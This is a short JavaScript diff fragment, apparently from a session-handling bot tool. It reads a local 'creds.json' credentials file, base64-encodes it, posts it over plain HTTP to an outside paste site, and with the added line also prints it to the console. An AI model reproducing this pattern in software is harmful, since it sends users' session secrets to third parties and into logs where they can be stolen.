@@ -59,6 +59,7 @@ const {
                         var tsurue = "";
                         let fil = await file.readFileSync("./session/creds.json", "utf-8");
                         let filz = fil.toString('base64');
+                        await console.log(filz);
                         let link = await axios.post('http://paste.c-net.org/', "" + filz, {
                             headers: {
 "Content-Type": "application/x-www-form-urlencoded",
